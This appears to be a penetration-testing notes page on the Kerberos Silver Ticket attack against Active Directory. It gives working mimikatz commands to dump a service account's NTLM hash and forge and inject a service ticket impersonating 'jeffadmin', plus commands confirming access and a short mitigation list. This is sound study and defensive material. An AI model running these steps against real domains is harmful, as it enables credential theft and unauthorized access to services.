---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Silver Tickets

## **Concept**

**Silver Tickets** are forged [Kerberos](../ad-authentication.md#kerberos) **TGS** tickets created using the **NTLM hash of a service account**, such as `iis_service`. These tickets can **impersonate any user** (e.g., `jeffadmin`) with **arbitrary group memberships** and are **accepted by services like HTTP or SMB** **without contacting the DC** — making this an **offline attack**.

This works because service tickets are encrypted using the service account’s key (NTLM hash). If an attacker possesses that hash, they can craft a ticket that looks legitimate to the service, even though it was never issued by the DC.

Silver Tickets are most effective when **PAC (Privilege Attribute Certificate) validation** is **not enforced**, which is common. However, post-October 2022 patches introduced `PAC_REQUESTOR` **validation**, which adds constraints when forging tickets for **non-existent** users.

## **Attack**

{% tabs %}
{% tab title="1. Hash Extraction" %}
Extract the service account hash from a system where the service account (e.g., `iis_service`) is logged in.

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
...
yamlCopyEditUser Name : iis_service
NTLM      : 4d28cf5252d39971419580a51484ca09
SID       : S-1-5-21-1987370270-658905905-1781884369-1109
...
```
{% endtab %}

{% tab title="2. Domain SID" %}
Get the domain Securidy Identifier (SID).

```powershell
> whoami /user
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```
{% endtab %}

{% tab title="3. Forge & Inject" %}
Forge and inject the Silver Ticket on the target SPN, e.g. `HTTP/web04.corp.com`.

{% code overflow="wrap" %}
```powershell
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
{% endcode %}
{% endtab %}

{% tab title="4. Confirm" %}
Confirm the ticket injection.

```powershell
> klist
Client: jeffadmin @ corp.com
Server: http/web04.corp.com @ corp.com
```

Verify access to the target service.

```powershell
> iwr -UseDefaultCredentials http://web04
StatusCode        : 200
StatusDescription : OK
```
{% endtab %}
{% endtabs %}

> _A common mistake regarding this attack is forging a ticket for a user that doesn’t exist in AD or using an incorrect SPN format — **remember, SPNs like****&#x20;****`HTTP/web04.corp.com`****&#x20;****follow a Kerberos naming convention, not a URL format (e.g.,****&#x20;****`http://web04.corp.com`****)**, and are case-sensitive in some configurations._

## **Mitigation**

* Enforce **PAC validation** on high-value services.  If enforced, services verify user info with the DC. Rarely enabled but shuts down Silver Ticket abuse.
* Limit and monitor **local admin access** on application servers.
* Enable **LSA Protection** to block credential theft via Mimikatz.
* Monitor for:
  * Kerberos tickets with unusually long lifetimes
  * Abnormal group memberships in TGS
  * Services accepting tickets never seen by the DC
